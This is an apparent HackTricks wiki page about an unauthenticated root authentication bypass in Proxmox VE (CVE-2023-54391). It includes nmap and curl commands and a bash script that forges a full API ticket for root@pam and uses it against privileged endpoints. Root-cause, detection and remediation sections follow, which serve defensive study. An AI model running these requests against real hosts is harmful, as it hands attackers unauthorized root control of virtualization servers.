---
title: "Proxmox VE"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/proxmox-ve.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

```
nmap -Pn -sV -p8006 <target>
curl -skI https://<target>:8006/
```
## TFA state confusion to a full API ticket

CVE-2023-54391 (PSA-2026-00043-1) affects `libpve-access-control >= 7.0-7 and < 8.0.4`. A client-controlled `tfa-challenge` parameter can place `POST /api2/json/access/ticket` directly into the second-factor path, so an unauthenticated request may obtain a full session as any enabled user without configured login TFA; default installations normally include `root@pam` in that set.[\[1\]](#references)[\[2\]](#references)

A minimal authorized test is one request; `password` can be arbitrary and `tfa-challenge` only needs to be non-empty.[\[2\]](#references)

```
curl -sk -X POST 'https://<target>:8006/api2/json/access/ticket' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=root@pam&password=x&tfa-challenge=1'
```
A vulnerable host returns HTTP 200 with `data.username`, a signed `data.ticket`, `data.CSRFPreventionToken`, and the selected user’s capability map. Patched versions reject the forged challenge with HTTP 401. The returned credential is a normal session rather than an intermediate TFA ticket, so it is immediately usable against privileged API operations.[\[2\]](#references)

```
BASE='https://<target>:8006'
RESP="$(curl -sk -X POST "$BASE/api2/json/access/ticket" \
  --data 'username=root@pam&password=x&tfa-challenge=1')"
TICKET="$(jq -r '.data.ticket' <<<"$RESP")"
CSRF="$(jq -r '.data.CSRFPreventionToken' <<<"$RESP")"
# Read-only validation
curl -sk "$BASE/api2/json/nodes" -H "Cookie: PVEAuthCookie=$TICKET"
# State-changing calls additionally require the CSRF token
curl -sk -X POST "$BASE/api2/json/<privileged-endpoint>" \
  -H "Cookie: PVEAuthCookie=$TICKET" \
  -H "CSRFPreventionToken: $CSRF"
```
### Root-cause chain

The reusable bug pattern is **client-selected authentication state plus fail-open null handling**. Trace every branch from the public endpoint to the point where a full session is minted; do not assume that reaching an “MFA response” handler proves completion of the password step. The vulnerable chain is:[\[2\]](#references)

1. Supplying `tfa-challenge` selects the second-factor branch and prevents execution from reaching the realm plugin’s password validator.
2. For accounts without the legacy `keys` field,`user_get_tfa()` returns`undef` before loading the modern`priv/tfa.cfg` object.
3. `authenticate_2nd_new_do()` sees the undefined configuration and returns before`verify_ticket($tfa_challenge, 0, $username)` can validate the challenge signature and user binding.
4. The caller interprets the missing pending-TFA value as authentication complete and mints a full ticket for the attacker-selected identity.

This suggests several general code-review and black-box tests: force later authentication states without first completing earlier states; mutate signed challenge fields to empty, arbitrary, cross-user, expired, and replayed values; test accounts with absent, empty, disabled, migrated, and directory-synchronized MFA metadata; and verify that every null/error result fails closed before session creation.[\[2\]](#references)

## Version verification

Check the installed package rather than inferring exposure only from the overall PVE release, because package and platform versions correlate loosely.[\[1\]](#references)

```
dpkg-query -W -f '${Version}\n' libpve-access-control
# or
pveversion -v
```
The package, configuration, and network boundaries are:[\[1\]](#references)

- **Vulnerable:**`libpve-access-control >= 7.0-7 and < 8.0.4` .
- **Fixed:**`libpve-access-control >= 8.0.4` ; supported PVE releases are not affected.
- **Configuration boundary:** users with any second factor configured for login do not take the vulnerable no-TFA path.
- **Reachability boundary:** exploitation requires access to TCP 8006 directly or through a reverse proxy.

## Detection

Hunt in `pveproxy` access logs and syslog for `POST /api2/json/access/ticket` requests carrying `tfa-challenge`. Prioritize HTTP 200 ticket creation from unexpected sources, successful `root@pam` authentication without the expected preceding flow, and follow-on terminal, permissions, VM, storage, backup, migration, networking, or power-management API requests. On patched hosts, bursts of HTTP 401 responses to the same endpoint can indicate attempted exploitation, but normal failed logins and broken clients remain false positives.[\[2\]](#references)

## Remediation

Upgrade to a supported release with `libpve-access-control >= 8.0.4`. For an affected EOL installation that cannot be upgraded immediately, Proxmox’s stop-gap inserts challenge verification before the vulnerable second-factor branch; verify that the file contains three matching calls and then reload both services.[\[1\]](#references)

```
sed -i.bck 's/^\t# This is the 2nd factor, use the password for the OTP response.$/\tverify_ticket($tfa_challenge, 0, $username);\n\t# This is the 2nd factor, use the password for the OTP response./' /usr/share/perl5/PVE/AccessControl.pm
grep -n 'verify_ticket($tfa_challenge, 0, $username)' /usr/share/perl5/PVE/AccessControl.pm | wc -l
systemctl reload-or-restart pvedaemon pveproxy
```
Reduce exposure independently of patching: restrict TCP 8006 to trusted administration networks. A localhost-only deployment can set `LISTEN_IP="127.0.0.1"` in `/etc/default/pveproxy`, restart `pveproxy`, and provide access through a VPN or SSH tunnel.[\[1\]](#references)[\[2\]](#references)

## References

- [1] [Proxmox PSA-2026-00043-1 — Authentication bypass in EOL Proxmox VE 7 release](https://forum.proxmox.com/threads/proxmox-virtual-environment-security-advisories.149331/post-867929)
- [2] [Nathan Xavier Golez — Proxmox VE 7.0–8.0.3 unauthenticated single-request root authentication bypass](https://blog.nathangolez.com/2026/08/proxmox-ve-7-08-0-3-unauthenticated-single-request-root-auth-bypass)
